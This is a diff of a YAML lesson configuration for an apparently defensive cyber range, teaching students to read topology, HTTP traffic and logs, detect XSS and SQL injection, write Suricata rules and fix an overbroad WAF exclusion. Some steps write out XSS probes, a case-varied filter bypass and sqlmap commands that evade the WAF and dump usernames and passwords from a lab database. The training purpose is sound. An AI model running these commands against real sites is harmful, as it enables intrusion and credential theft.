@@ -21,13 +21,15 @@ defense:
   ids:
     waf: {paranoia: 1}
     suricata: no-uri-sqli.rules
-  missed:
+  xss-gap:
+    waf: {paranoia: 1}
+    suricata: no-xss.rules
+  overbroad:
     waf:
       paranoia: 1
       exclusions:
-        - {rule_id: 949110}
-        - {rule_id: 959100}
-    suricata: local.rules
+        - {tag: OWASP_CRS, target: "ARGS:sort"}
+    suricata: no-uri-sqli.rules
   level2:
     waf: {paranoia: 2}
     suricata: local.rules
@@ -276,159 +278,238 @@ scenarios:
 foundations:
   - id: f1
     order: 1
-    text: lesson.range
+    text: lesson.map
     level: easy
     minutes: 10
     prerequisites: []
     defense: full
     cases: [board-normal-search]
     theory:
-      - {id: map, shows: map}
-    hints: [why_entry]
+      - {id: map, shows: board_ip}
     steps:
-      - id: map
-        point: {panel: '.pane-tab[data-pane="topology"]'}
-        check: {kind: click}
-      - id: entry
-        point: {pane: true, opens: topology}
-        check: {kind: answer, of: entry}
-      - id: logs
-        point: {pane: true, opens: topology}
+      - id: board_ip
+        point: {opens: topology, map: {label: [board.com, sw1]}}
+        check: {kind: answer, of: address, host: board.com, zone: service}
+      - id: db_subnet
+        point: {opens: topology, map: {zone: "{switch:board-db}"}}
+        check: {kind: answer, of: subnet, host: board-db}
+      - id: kali_zone
+        point: {opens: topology, map: {node: kali}}
+        check: {kind: answer, of: zone_of, host: kali}
+      - id: path
+        point: {opens: topology, map: {zone: internet}}
+        check: {kind: answer, of: path, form: order}
+      - id: log_host
+        point: {opens: topology, map: {zone: sw3}}
         check: {kind: answer, of: logs}
-      - id: segment
-        point: {pane: true, opens: topology}
-        check: {kind: answer, of: segment}
+      - id: db_ip
+        point: {opens: topology}
+        check: {kind: answer, of: address, host: board-db}
   - id: f2
     order: 2
-    text: lesson.follow
+    text: lesson.http
     level: easy
     minutes: 15
     prerequisites: [f1]
     defense: full
     cases: [board-normal-search]
     theory:
-      - {id: path, shows: status}
-    hints: [why_status]
+      - {id: request, shows: method}
     steps:
       - id: search
-        point: {panel: "#site-address", opens: site}
-        check: {kind: sent, match: '[\uAC00-\uD7A3]'}
+        point: {opens: site, site: "input[name=q]"}
+        check: {kind: sent, match: '^/search/\?(.*&)?q=.'}
+      - id: method
+        point: {opens: site, dev: general.method}
+        check: {kind: answer, of: method, about: search}
+      - id: parameter
+        point: {opens: site, dev: payload.query}
+        check: {kind: answer, of: parameter, about: search}
+      - id: path
+        point: {opens: site, dev: general.url}
+        check:
+          kind: answer
+          of: path
+          about: search
+          wrong_if:
+            - {match: '^https?://|board\.com', says: host}
+            - {match: '\?', says: query}
       - id: status
-        point: {panel: "#site-dev-toggle", opens: site}
+        point: {opens: site, dev: general.status}
         check: {kind: answer, of: status, about: search}
+      - id: sort
+        point: {opens: site, site: "select[name=sort]", until: sent, then: {dev: payload.query}}
+        check: {kind: answer, of: parameter, match: '[?&]sort='}
+      - id: missing
+        point: {opens: site}
+        check: {kind: answer, of: status, match: '^/posts/\d+/'}
   - id: f3
     order: 3
-    text: lesson.http
+    text: lesson.logs
     level: easy
-    minutes: 10
+    minutes: 20
     prerequisites: [f2]
     defense: full
     cases: [board-normal-search]
     theory:
-      - {id: request, shows: method}
-    hints: [why_parameter]
+      - {id: discover, shows: site_source}
+      - {id: proxy, shows: site_host}
     steps:
       - id: search
-        point: {panel: "#site-address", opens: site}
-        check: {kind: sent, match: '[\uAC00-\uD7A3]'}
-      - id: method
-        point: {panel: "#site-dev-toggle", opens: site}
-        check: {kind: answer, of: method, about: search}
-      - id: path
-        point: {panel: "#site-address", opens: site}
-        check: {kind: answer, of: path, about: search}
-      - id: parameter
-        point: {panel: "#site-address", opens: site}
-        check: {kind: answer, of: parameter, about: search}
-      - id: meaning
-        point: {panel: "#site-dev-toggle", opens: site}
-        check: {kind: choice, of: status_class, about: search, options: [2xx, 3xx, 4xx, 5xx]}
+        point: {opens: site, site: "input[name=q]"}
+        check: {kind: sent, match: '[?&]q=[A-Za-z0-9]{4,}(&|$)'}
+      - id: site_source
+        point: {opens: elk, kibana: {doc: source_ip}}
+        check: {kind: answer, of: sensor_source, about: search, leg: upstream}
+      - id: site_host
+        point: {opens: topology, map: {zone: sw1}}
+        check: {kind: answer, of: host_of, from: site_source}
+      - id: client_source
+        point: {opens: elk, kibana: {doc: source_ip}}
+        check: {kind: answer, of: sensor_source, about: search, leg: inbound}
+      - id: xff
+        point: {opens: elk, kibana: {doc: request_headers}}
+        check: {kind: answer, of: forwarded_for, about: search, leg: upstream}
+      - id: waf_logged
+        point: {opens: elk, kibana: {hits: true}}
+        check: {kind: choice, of: waf_logged, about: search, options: [present, absent]}
+      - id: count
+        point: {opens: elk}
+        check: {kind: answer, of: hits, path: /search/, leg: inbound}
   - id: f4
     order: 4
-    text: lesson.logs
-    level: easy
-    minutes: 15
+    text: lesson.xss
+    level: medium
+    minutes: 30
     prerequisites: [f3]
-    defense: full
+    defense: xss-gap
+    detected_by: suricata
     cases: [board-normal-search]
     theory:
-      - {id: records, shows: engine}
-    hints: [why_one_engine]
+      - {id: score, shows: score}
+      - {id: rule, shows: write}
     steps:
-      - id: search
-        point: {panel: "#site-address", opens: site}
-        check: {kind: sent, match: '[\uAC00-\uD7A3]'}
-      - id: engine
-        point: {pane: true, opens: elk}
-        query: 'event_type : "http" and url : *search*'
-        records: all
-        check: {kind: choice, of: engine, about: search, options: [modsecurity, suricata]}
       - id: probe
-        point: {panel: "#site-address", opens: site}
-        check: {kind: sent, match: script}
-      - id: find
-        point: {kibana: '[data-test-subj="docTableExpandToggleColumn"]', opens: elk}
-        query: "url : *script* and status : 403"
-        check: {kind: click}
-      - id: verdict
-        point: {kibana: '[data-test-subj="field-status"]', first: '[data-test-subj="docTableExpandToggleColumn"]', opens: elk}
+        point: {opens: site, site: "input[name=q]"}
+        check: {kind: sent, match: '<script'}
+      - id: status
+        point: {opens: site, dev: general.status}
         check: {kind: answer, of: status, about: probe}
-      - id: address
-        point: {kibana: '[data-test-subj="field-source_ip"]', first: '[data-test-subj="docTableExpandToggleColumn"]', opens: elk}
-        check: {kind: answer, of: waf_source, about: probe}
+      - id: rule
+        point: {opens: elk, kibana: {doc: rule_id}}
+        check: {kind: answer, of: rule, marker: browse, path: "<script", known: ["949110"]}
+      - id: score
+        point: {opens: elk, kibana: {doc: rule}}
+        check: {kind: answer, of: anomaly_total, about: probe}
+      - id: upper
+        point: {opens: site, site: "input[name=q]", until: sent, then: {dev: general.status}}
+        check: {kind: answer, of: status, match: '<(?!script)(?i:script)'}
+      - id: ids_none
+        point: {opens: elk, kibana: {hits: true}}
+        check: {kind: choice, of: alerted, about: [probe, upper], options: [present, absent]}
+      - id: write
+        point: {opens: rules, panel: "#lesson-rules"}
+        check: {kind: rules}
+      - id: fired
+        point: {opens: site, site: "input[name=q]", until: sent, then: {kibana: {doc: rule_id}}}
+        check: {kind: answer, of: alerted_sid, match: '<script', after: write}
+      - id: slipped
+        point: {opens: site, site: "input[name=q]", until: sent, then: {kibana: {hits: true}}}
+        check: {kind: choice, of: alerted_sid_present, match: '<(?!script)(?i:script)', after: write, options: ["yes", "no"]}
+      - id: nocase
+        point: {opens: rules, panel: "#lesson-rules"}
+        check: {kind: rules, needs: nocase}
+      - id: replay
+        point: {opens: site}
+        check:
+          kind: replay
+          after: nocase
+          attack: {sent: '<(?!script)(?i:script)'}
+          expect: {alerted_sid: added}
+          benign: {sent: '^/search/\?q=[^<>]*$', expect: {alerted_sid: none, status_class: 2xx}}
   - id: f5
     order: 5
-    text: lesson.attack
-    level: easy
+    text: lesson.sqli
+    level: medium
     minutes: 25
     prerequisites: [f4]
     defense: full
     cases: [board-normal-search]
     theory:
-      - {id: attack, shows: stopped}
-    hints: [why_total, why_count]
+      - {id: orderby, shows: error}
+      - {id: sqlmap, shows: sqlmap}
     steps:
-      - id: attack
-        point: {panel: "#site-address", opens: site}
-        check: {kind: sent, match: "1=1"}
-      - id: stopped
-        point: {panel: "#site-dev-toggle", opens: site}
-        check: {kind: answer, of: stopped_at, about: attack}
-      - id: rule
-        point: {kibana: '[data-test-subj="field-rule_id"]', first: '[data-test-subj="docTableExpandToggleColumn"]', opens: elk}
-        query: "url : *search* and status : 403"
-        check: {kind: answer, of: rule, marker: browse, path: "1=1", known: ["949110"]}
+      - id: sort
+        point: {opens: site, site: "select[name=sort]", until: sent, then: {dev: payload.query}}
+        check: {kind: answer, of: param_value, name: sort, match: '[?&]sort='}
+      - id: error
+        point: {opens: site, panel: "#site-address", until: sent, then: {dev: general.status}}
+        check: {kind: answer, of: status, match: '[?&]sort=[^&]*\)'}
+      - id: undetected
+        point: {opens: elk, kibana: {doc: rule_id}}
+        check: {kind: choice, of: waf_detected, about: error, options: [present, absent]}
       - id: sqlmap
-        point: {pane: true, opens: kali}
+        point: {opens: kali, term: {pane: kali, match: '\$ $'}}
+        command: 'sqlmap -u "http://board.com/?sort=posts_post.id*" --dbms=mysql --technique=BT --level=5 --risk=3 --batch --flush-session'
         check: {kind: kali, case: board-sqli-orderby-sqlmap}
-      - id: requests
-        point: {pane: true}
-        check: {kind: answer, of: requests, about: sqlmap}
+      - id: verdict
+        point: {opens: kali, term: {pane: kali, match: 'injectable'}}
+        check: {kind: choice, of: sqlmap_found, about: sqlmap, options: ["yes", "no"]}
+      - id: source
+        point: {opens: elk, kibana: {sidebar: source_ip}}
+        check: {kind: answer, of: kali_source, about: sqlmap}
+      - id: scanner
+        point: {opens: elk, kibana: {doc: rule}}
+        check: {kind: answer, of: rule, marker: "step:sqlmap", family: "913"}
+      - id: agent
+        point: {opens: kali, term: {pane: kali, match: '\$ $'}}
+        command: 'sqlmap -u "http://board.com/?sort=posts_post.id*" --dbms=mysql --technique=BT --level=5 --risk=3 --batch --flush-session --random-agent'
+        check: {kind: kali, case: board-sqli-orderby-sqlmap-random-agent, ua: any}
+      - id: still
+        point: {opens: elk}
+        check: {kind: answer, of: rule, marker: "step:agent", known: ["949110", "913100"]}
   - id: f6
     order: 6
     text: lesson.miss
     level: medium
-    minutes: 25
+    minutes: 30
     prerequisites: [f5]
-    defense: missed
+    defense: overbroad
     cases: [board-normal-search]
     theory:
-      - {id: cost, shows: lost}
-    hints: [why_leak]
+      - {id: exception, shows: excluded}
+      - {id: cost, shows: cost}
     steps:
       - id: excluded
-        point: {pane: true, opens: waf}
-        command: cat {waf_rules}
-        check: {kind: answer, of: excluded}
-      - id: sqlmap
-        point: {pane: true, opens: kali}
-        check: {kind: kali, case: board-sqli-orderby-sqlmap}
+        point: {opens: waf, term: {pane: waf, match: 'ruleRemove'}}
+        command: grep -n ruleRemove {waf_rules}
+        check: {kind: answer, of: excluded_target}
+      - id: dump
+        point: {opens: kali, term: {pane: kali, match: '\$ $'}}
+        command: 'sqlmap -u "http://board.com/?sort=posts_post.id*" --dbms=mysql --technique=BT --level=5 --risk=3 --random-agent --skip-waf -D board -T auth_user -C username,password --dump --batch --answers="crack=N" --flush-session'
+        check: {kind: kali, case: board-sqli-orderby-sqlmap-random-agent, ua: any}
       - id: loot
-        point: {pane: true}
-        check: {kind: loot, about: sqlmap}
-      - id: leaked
-        point: {pane: true}
-        check: {kind: answer, of: leaked, about: sqlmap}
-      - id: lost
-        point: {pane: true}
-        check: {kind: answer, of: lost}
+        point: {opens: kali, term: {pane: kali, match: '^\|'}}
+        check: {kind: loot, about: dump}
+      - id: alerts
+        point: {opens: elk, kibana: {hits: true}}
+        check: {kind: choice, of: alerted_by, about: dump, options: [none, ids, waf, both]}
+      - id: seen
+        point: {opens: elk, kibana: {sidebar: source_ip}}
+        check: {kind: answer, of: kali_source, about: dump, from: http}
+      - id: cost
+        point: {opens: elk, panel: "#lesson-objectives .total"}
+        check: {kind: answer, of: lost_points}
+      - id: narrow
+        point: {opens: waf, term: {pane: waf, match: '\$ $'}}
+        command: "{sudo}nano {waf_rules} && {waf_reload}"
+        check: {kind: waf_changed, removed_target: "ARGS:sort"}
+      - id: replay
+        point: {opens: kali}
+        command: 'sqlmap -u "http://board.com/?sort=posts_post.id*" --dbms=mysql --technique=BT --level=5 --risk=3 --random-agent --skip-waf -D board -T auth_user -C username,password --dump --batch --answers="crack=N" --flush-session'
+        check:
+          kind: replay
+          after: narrow
+          attack: {kali: board-sqli-orderby-sqlmap-random-agent, ua: any}
+          expect: {blocked: true, loot: none}
+          benign: {sent: '[?&]sort=(-?created_at|title)$', expect: {status_class: 2xx, waf_logged: false}}
